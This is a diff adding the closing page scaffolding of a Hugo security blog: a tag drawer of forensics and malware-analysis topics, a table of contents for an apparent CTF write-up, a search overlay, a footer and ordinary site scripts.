+      class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+      Tags
+      <div class="tooltip-arrow" data-popper-arrow></div>
+    </div>
+
+    
+    
+      <button
+        id="to-bottom-button"
+        type="button"
+        data-tooltip-target="tooltip-bottom"
+        data-tooltip-placement="left"
+        class="flex h-[52px] w-[52px] items-center justify-center rounded-full border border-gray-200 bg-white text-gray-500 shadow-sm hover:bg-gray-50 hover:text-gray-900 focus:outline-none focus:ring-4 focus:ring-gray-300 dark:border-gray-600 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600 dark:hover:text-white dark:focus:ring-gray-400">
+        <svg
+          class="h-5 w-5"
+          aria-hidden="true"
+          fill="currentColor"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg">
+          <path
+            d="M635.733333 341.333333c19.2 0 32 12.8 32 29.866667v236.8h155.733334c12.8 0 25.6 8.533333 27.733333 21.333333 2.133333 4.266667 2.133333 6.4 2.133333 10.666667 0 8.533333-6.4 19.2-12.8 25.6L529.066667 910.933333c-12.8 8.533333-27.733333 8.533333-40.533334 0L181.333333 663.466667c-8.533333-8.533333-12.8-21.333333-8.533333-34.133334 2.133333-12.8 14.933333-21.333333 27.733333-21.333333h151.466667V371.2c0-19.2 12.8-29.866667 34.133333-29.866667h249.6z m-6.4-128c17.066667 0 32 14.933333 32 32s-14.933333 32-32 32h-234.666666c-17.066667 0-32-14.933333-32-32s14.933333-32 32-32h234.666666z m0-106.666666c17.066667 0 32 14.933333 32 32S646.4 170.666667 629.333333 170.666667h-234.666666c-17.066667 0-32-14.933333-32-32S377.6 106.666667 394.666667 106.666667h234.666666z"></path>
+        </svg>
+        <span class="sr-only">Bottom</span>
+      </button>
+      <div
+        id="tooltip-bottom"
+        role="tooltip"
+        class="tooltip invisible absolute z-10 inline-block w-auto rounded-lg bg-gray-900 px-3 py-2 text-sm font-medium text-white opacity-0 shadow-sm transition-opacity duration-300 dark:bg-gray-700">
+        Bottom
+        <div class="tooltip-arrow" data-popper-arrow></div>
+      </div>
+    
+  </div>
+
+  <button
+    type="button"
+    data-dial-toggle="speed-dial-menu-bottom-right"
+    aria-controls="speed-dial-menu-bottom-right"
+    aria-expanded="false"
+    class="flex h-14 w-14 items-center justify-center rounded-full bg-primary text-white hover:bg-primary700 focus:outline-none focus:ring-4 focus:ring-primary dark:bg-primary dark:hover:bg-primary700 dark:focus:ring-primary700">
+    <svg
+      class="h-5 w-5 transition-transform group-hover:rotate-45"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 18 18">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="M9 1v16M1 9h16" />
+    </svg>
+    <span class="sr-only">Open actions menu</span>
+  </button>
+</div>
+<div
+  id="drawer-body-scrolling"
+  class="fixed left-0 top-0 z-40 h-screen w-64 -translate-x-full overflow-y-auto bg-white p-4 transition-transform md:w-80 lg:w-96 dark:bg-gray-800"
+  tabindex="-1"
+  aria-labelledby="drawer-body-scrolling-label">
+  <h5
+    id="drawer-body-scrolling-label"
+    class="text-base font-semibold uppercase text-gray-500 dark:text-gray-400">
+    TAGS
+  </h5>
+  <button
+    type="button"
+    data-drawer-hide="drawer-body-scrolling"
+    aria-controls="drawer-body-scrolling"
+    class="absolute end-2.5 top-2.5 inline-flex h-8 w-8 items-center justify-center rounded-lg bg-transparent text-sm text-gray-400 hover:bg-gray-200 hover:text-gray-900 dark:hover:bg-gray-600 dark:hover:text-white">
+    <svg
+      class="h-3 w-3"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 14 14">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
+    </svg>
+    <span class="sr-only">Close tags</span>
+  </button>
+
+  <div class="overflow-y-auto py-3">
+    <div class="flex flex-wrap justify-center gap-2 p-3">
+      
+        <a
+          href="http://localhost:1313/tags/bi0sctf/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Bi0sCTF</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/bi0sctf2024/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Bi0sctf2024</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/blockchain-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Blockchain Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/browser-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Browser Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/dfir/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">DFIR</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/file-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">File Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/incident-response/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Incident Response</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/mac-artefact-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">MAC Artefact Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-analyis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Analyis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/malware-development/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Malware Development</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/memory-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Memory Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/password-retrieval/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Password Retrieval</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/process-memory-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Process Memory Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-analysis/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Analysis</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-investigation/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Investigation</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/ransomware-recovery/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Ransomware Recovery</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/reverse-engineering/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Reverse Engineering</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/threat-hunting/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Threat Hunting</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >2</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/windbg-dump-debugging/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">WinDBG Dump Debugging</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >3</span
+          >
+        </a>
+      
+        <a
+          href="http://localhost:1313/tags/windows-forensics/"
+          class="group flex items-center rounded-lg border p-2 text-xs text-gray-900 hover:bg-gray-100 dark:text-white dark:hover:bg-gray-700">
+          <span class="flex-1 whitespace-nowrap">Windows Forensics</span>
+          <span
+            class="ms-2 inline-flex h-2 w-2 items-center justify-center rounded-full bg-blue-100 p-2 text-xs font-medium text-blue-800 dark:bg-blue-900 dark:text-blue-300"
+            >1</span
+          >
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<div
+  id="drawer-body-scrolling-toc"
+  class="fixed left-0 top-0 z-40 h-screen w-64 -translate-x-full overflow-y-auto bg-white p-4 transition-transform dark:bg-gray-800 md:w-80 lg:w-96"
+  tabindex="-1"
+  aria-labelledby="drawer-body-scrolling-toc-label">
+  <h5
+    id="drawer-body-scrolling-toc-label"
+    class="text-base font-semibold text-gray-500 dark:text-gray-400">
+    On this page
+  </h5>
+  <button
+    type="button"
+    data-drawer-hide="drawer-body-scrolling-toc"
+    aria-controls="drawer-body-scrolling-toc"
+    class="absolute end-2.5 top-2.5 inline-flex h-8 w-8 items-center justify-center rounded-lg bg-transparent text-sm text-gray-400 hover:bg-gray-200 hover:text-gray-900 dark:hover:bg-gray-600 dark:hover:text-white">
+    <svg
+      class="h-3 w-3"
+      aria-hidden="true"
+      xmlns="http://www.w3.org/2000/svg"
+      fill="none"
+      viewBox="0 0 14 14">
+      <path
+        stroke="currentColor"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+        stroke-width="2"
+        d="m1 1 6 6m0 0 6 6M7 7l6-6M7 7l-6 6" />
+    </svg>
+    <span class="sr-only">Close menu</span>
+  </button>
+  <div class="overflow-y-auto py-4">
+    <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#challenge-description">Challenge Description:</a></li>
+        <li><a href="#solution">Solution</a></li>
+        <li><a href="#static-analysis">Static Analysis</a></li>
+        <li><a href="#one-step-ahead">One step Ahead</a></li>
+        <li><a href="#dynamic-analysis">Dynamic Analysis</a></li>
+        <li><a href="#flag">flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#closing-note">Closing Note</a></li>
+  </ul>
+</nav>
+  </div>
+</div>
+
+
+
+<script type="module" src="/js/to-top-or-bottom.js"></script>
+
+
+
+
+
+    
+<div
+  id="search-overlay"
+  class="fixed inset-0 z-50 hidden bg-gray-900/90 backdrop-blur-lg dark:bg-gray-900/80"></div>
+<section id="search-section" class="z-50 flex hidden h-dvh w-full flex-col">
+  
+  <div
+    class="flex h-dvh w-full flex-col overflow-auto md:mx-auto md:w-2/3 lg:max-w-2xl">
+    
+    <div
+      id="searchBoxDiv"
+      class="sticky top-[-88px] z-50 flex flex-row justify-between px-8 pt-[88px]">
+      <div id="searchBox" class="my-6 flex w-full flex-row items-center"></div>
+    </div>
+
+    
+    <div class="h-[30rem] overflow-auto">
+      <div id="searchResults" class="my-3 px-6"></div>
+      <div
+        id="NotSearchResults"
+        class="hidden flex-col items-center justify-around space-y-4 px-6 py-10">
+        <p class="font-Oswald text-lg font-bold tracking-wide text-gray-500">
+          No search content
+        </p>
+      </div>
+      <div
+        id="searchError"
+        class="hidden flex-col items-center justify-around space-y-4 px-6 py-10 text-center ">
+        <p class="font-Oswald text-lg font-bold text-red-500">
+          Oop ! Error occur ...
+        </p>
+      </div>
+      <div
+        id="searchLoading"
+        class="hidden flex-col items-center justify-around px-6 py-10">
+        <svg
+          t="1689331200868"
+          class="icon animate-spin"
+          viewBox="0 0 1024 1024"
+          version="1.1"
+          xmlns="http://www.w3.org/2000/svg"
+          p-id="51409"
+          width="128"
+          height="128">
+          <path
+            d="M512 170.666667v85.333333a256 256 0 1 1-223.573333 131.2L213.930667 345.6A341.333333 341.333333 0 1 0 512 170.666667z"
+            fill="#bfbfbf"
+            opacity=".3"
+            p-id="51410"></path>
+        </svg>
+      </div>
+    </div>
+  </div>
+  
+  <div
+    class="bottom-0 flex flex-col items-center justify-center space-y-2 py-8 font-Oswald text-xs font-bold text-gray-600">
+    <div class="hidden md:block">Press ESC to cancle</div>
+    <div class="flex items-center">
+      <span class="">Powered by &nbsp;</span>
+      <img src="/images/default/algolia-logo.svg" alt="" class="h-4" />
+    </div>
+  </div>
+</section>
+
+<script
+  src="https://cdn.jsdelivr.net/npm/algoliasearch@4.17.2/dist/algoliasearch-lite.umd.js"
+  integrity="sha256-X2G+vjV8i6Jj2NSGFTvy6Z4q2AlmF5aH0HiIpWJ8eU4="
+  crossorigin="anonymous"></script>
+<script
+  src="https://cdn.jsdelivr.net/npm/instantsearch.js@4.56.3/dist/instantsearch.production.min.js"
+  integrity="sha256-mWvjWAfZylKMOg+S3HLq+wng1HHRnl2Idr2r8NsUzIU="
+  crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+<script src="/js/search.js"></script>
+<footer
+  class="mx-auto flex w-full max-w-screen-xl flex-col-reverse items-center gap-y-3 border-t border-gray-200 py-6 md:px-12 lg:flex-row lg:justify-between dark:border-gray-700">
+  
+  <div
+    class="flex flex-col items-center justify-between space-y-3 text-xs text-gray-400 lg:items-start dark:text-gray-500">
+    
+    <div class="items-center font-Montserrat font-light">
+      &copy;
+      
+      
+      
+        2024
+      
+
+      azr43lkn1ght. All Rights Reserved
+    </div>
+  </div>
+
+  
+  <div
+    class="flex flex-row items-center font-Montserrat text-xs font-light text-gray-400 dark:text-gray-500">
+    <span>Powered By</span>
+    <a href="https://gohugo.io/" aria-label="hugo link">
+      <img
+        src="/images/default/hugo-logo-wide.svg"
+        alt="Hugo"
+        class="mx-1 h-3" />
+    </a>
+    <span> &#8739; Based on Theme</span>
+    <a
+      href="https://github.com/mrhelloboy/seven"
+      aria-label="The github address of seven theme"
+      class="">
+      <img
+        id="footer-theme-light-logo"
+        src="/images/default/seven-logo.svg"
+        alt="seven theme logo"
+        class="mx-1 h-5" />
+
+      <img
+        id="footer-theme-dark-logo"
+        src="/images/default/seven-logo-dark.svg"
+        alt="seven theme logo"
+        class="mx-1 hidden h-5" />
+    </a>
+  </div>
+
+  
+  <div
+    class="mt-4 flex space-x-5 sm:justify-center md:mt-0 rtl:space-x-reverse">
+    
+      
+        <a
+          href="mailto:nithinchenthur@gmail.com"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            fill="currentColor"
+            viewBox="0 0 1024 1024"
+            version="1.1"
+            xmlns="http://www.w3.org/2000/svg">
+            <path
+              d="M513 583.8l448.5-448.5c-11.6-4.7-24.3-7.3-37.5-7.3H100c-12.7 0-24.9 2.4-36.1 6.7L513 583.8z"
+              p-id="88208"></path>
+            <path
+              d="M513 674.3L14.6 175.9C5.3 191.1 0 208.9 0 228v568c0 55.2 44.8 100 100 100h824c55.2 0 100-44.8 100-100V228c0-18.5-5.1-35.9-13.9-50.8L513 674.3z"
+              p-id="88209"></path>
+          </svg>
+          <span class="sr-only">Email page</span>
+        </a>
+      
+      
+
+      
+
+      
+
+      
+    
+      
+      
+
+      
+
+      
+        <a
+          href="https://github.com/Azr43lKn1ght"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="currentColor"
+            viewBox="0 0 20 20">
+            <path
+              fill-rule="evenodd"
+              d="M10 .333A9.911 9.911 0 0 0 6.866 19.65c.5.092.678-.215.678-.477 0-.237-.01-1.017-.014-1.845-2.757.6-3.338-1.169-3.338-1.169a2.627 2.627 0 0 0-1.1-1.451c-.9-.615.07-.6.07-.6a2.084 2.084 0 0 1 1.518 1.021 2.11 2.11 0 0 0 2.884.823c.044-.503.268-.973.63-1.325-2.2-.25-4.516-1.1-4.516-4.9A3.832 3.832 0 0 1 4.7 7.068a3.56 3.56 0 0 1 .095-2.623s.832-.266 2.726 1.016a9.409 9.409 0 0 1 4.962 0c1.89-1.282 2.717-1.016 2.717-1.016.366.83.402 1.768.1 2.623a3.827 3.827 0 0 1 1.02 2.659c0 3.807-2.319 4.644-4.525 4.889a2.366 2.366 0 0 1 .673 1.834c0 1.326-.012 2.394-.012 2.72 0 .263.18.572.681.475A9.911 9.911 0 0 0 10 .333Z"
+              clip-rule="evenodd" />
+          </svg>
+          <span class="sr-only">GitHub account</span>
+        </a>
+      
+
+      
+    
+      
+      
+
+      
+        <a
+          href="https://twitter.com/Azr43lKn1ght"
+          class="text-gray-400 hover:text-gray-900 dark:hover:text-white">
+          <svg
+            class="h-4 w-4"
+            aria-hidden="true"
+            xmlns="http://www.w3.org/2000/svg"
+            fill="none"
+            viewBox="0 0 20 20">
+            <path
+              fill="currentColor"
+              d="M12.186 8.672 18.743.947h-2.927l-5.005 5.9-4.44-5.9H0l7.434 9.876-6.986 8.23h2.927l5.434-6.4 4.82 6.4H20L12.186 8.672Zm-2.267 2.671L8.544 9.515 3.2 2.42h2.2l4.312 5.719 1.375 1.828 5.731 7.613h-2.2l-4.699-6.237Z" />
+          </svg>
+
+          <span class="sr-only">X page</span>
+        </a>
+      
+
+      
+
+      
+    
+
+    
+    
+
+  </div>
+</footer>
+
+<script>
+  var matches = document.querySelectorAll("button[data-popover-target]");
+  for (var i = 0; i < matches.length; i++) {
+    let id = matches[i].getAttribute("data-popover-target");
+
+    matches[i].addEventListener("mouseenter", function () {
+      document.getElementById(id).classList.remove("hidden");
+    });
+
+    matches[i].addEventListener("mouseleave", function () {
+      document.getElementById(id).classList.add("hidden");
+    });
+  }
+</script>
+
+
+<script src="/js/dark-mode.js" defer></script>
+
+  
+    
+    
+    <script src="/js/toc.js"></script>
+  
+
+  
+
+  
+  
+  <script src="/js/zoom-img.js" defer></script>
+
+  
+  
+  <script src="/js/link-to-top.js" defer></script>
+
+  
+    
+    
+    <script src="/js/code-copy.js" defer></script>
+  
+
+  <script
+    data-goatcounter="https://seven-demo.goatcounter.com/count"
+    async
+    src="//gc.zgo.at/count.js"></script>
+
+</body>
+</html>
